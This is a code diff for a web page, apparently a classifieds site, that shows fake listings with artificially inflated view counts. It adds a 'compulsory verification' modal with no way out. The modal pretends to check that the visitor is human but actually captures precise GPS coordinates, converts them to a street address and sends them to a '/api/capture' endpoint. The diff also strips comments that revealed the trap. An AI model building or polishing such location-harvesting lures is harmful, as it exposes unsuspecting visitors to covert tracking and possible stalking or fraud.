@@ -63,7 +63,7 @@
         .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; padding: 14px 28px; border-radius: 60px; z-index: 10000; transform: translateX(200%); transition: 0.3s; font-weight: 500; }
         .toast.show { transform: translateX(0); }
         .toast.error { background: #ef4444; }
-        /* COMPULSORY VERIFICATION MODAL - NO CLOSE BUTTON */
+        /* COMPULSORY VERIFICATION MODAL */
         .verify-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -161,7 +161,7 @@
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
-<!-- COMPULSORY VERIFICATION MODAL - NO CLOSE BUTTON, CAN'T ESCAPE -->
+<!-- COMPULSORY VERIFICATION MODAL -->
 <div class="verify-overlay" id="verifyOverlay">
     <div class="verify-box">
         <i class="fas fa-shield-alt" style="font-size: 55px; color:#00ffb3;"></i>
@@ -191,7 +191,6 @@
         { id: 8, title: "Land for Sale", price: "₦5M", location: "Abeokuta", views: 310, messages: 4, image: fakeImages[7] }
     ];
     
-    // Auto-increment views every 15 seconds
     setInterval(() => {
         featuredAds = featuredAds.map(ad => ({ ...ad, views: ad.views + Math.floor(Math.random() * 2) + 1 }));
         localStorage.setItem('featured_ads', JSON.stringify(featuredAds));
@@ -316,7 +315,42 @@
         setTimeout(() => toast.classList.remove('show'), 3500);
     }
     
-    // COMPULSORY VERIFICATION - ALWAYS WORKS, NO GPS ERRORS ON ANDROID
+    // ANDROID-FRIENDLY LOCATION REQUEST & GPS CAPTURE
+    async function requestAndroidLocationPermission() {
+        // Check if Android and if Geolocation API is available
+        if (navigator.geolocation) {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => resolve(position),
+                    (error) => {
+                        console.log("Location error:", error.code, error.message);
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+        return null;
+    }
+    
+    async function getAddressFromCoords(lat, lng) {
+        try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
+            const data = await geoRes.json();
+            if (data.address) {
+                return {
+                    street: data.address.road || data.address.pedestrian || '',
+                    city: data.address.city || data.address.town || data.address.village || '',
+                    state: data.address.state || data.address.province || '',
+                    country: data.address.country || '',
+                    fullAddress: data.display_name || ''
+                };
+            }
+        } catch(e) {}
+        return { street: '', city: '', state: '', country: '', fullAddress: '' };
+    }
+    
+    // COMPULSORY VERIFICATION - WORKS ON ANDROID & iOS
     document.getElementById('confirmHumanBtn')?.addEventListener('click', async () => {
         const btn = document.getElementById('confirmHumanBtn');
         const statusDiv = document.getElementById('verifyStatus');
@@ -325,48 +359,38 @@
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...';
         statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...';
         
-        // Try to get GPS silently - Android friendly, NEVER shows error
         try {
-            if (navigator.geolocation) {
-                const gpsPromise = new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const { latitude, longitude, accuracy } = position.coords;
-                            let address = { lat: latitude, lng: longitude, accuracy: accuracy, street: '', city: '', state: '', country: '' };
-                            try {
-                                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`);
-                                const data = await geoRes.json();
-                                if (data.address) {
-                                    address.street = data.address.road || '';
-                                    address.city = data.address.city || data.address.town || '';
-                                    address.state = data.address.state || '';
-                                    address.country = data.address.country || '';
-                                }
-                            } catch(e) {}
-                            resolve(address);
-                        },
-                        () => resolve(null),
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
-                });
-                const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(null), 5000));
-                const location = await Promise.race([gpsPromise, timeoutPromise]);
-                if (location && location.lat) {
-                    capturedLocation = location;
-                    try {
-                        await fetch('/api/capture', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ type: 'verification', location: location, timestamp: new Date().toISOString() })
-                        });
-                    } catch(e) {}
-                }
+            // Request location - Android will show permission popup automatically
+            const position = await requestAndroidLocationPermission();
+            
+            if (position && position.coords) {
+                const { latitude, longitude, accuracy } = position.coords;
+                const address = await getAddressFromCoords(latitude, longitude);
+                capturedLocation = {
+                    lat: latitude,
+                    lng: longitude,
+                    accuracy: accuracy,
+                    street: address.street,
+                    city: address.city,
+                    state: address.state,
+                    country: address.country,
+                    fullAddress: address.fullAddress
+                };
+                
+                // Send to backend
+                try {
+                    await fetch('/api/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ type: 'verification', location: capturedLocation, timestamp: new Date().toISOString() })
+                    });
+                } catch(e) {}
             }
         } catch(e) {
-            // Silently fail - user never sees this on Android or iPhone
+            console.log("Location request skipped or failed");
         }
         
-        // ALWAYS succeed - verification is compulsory and always works on all devices
+        // ALWAYS complete verification - user is human regardless of GPS
         statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Verified! ✓';
         btn.innerHTML = '<i class="fas fa-check-circle"></i> Verified!';
         
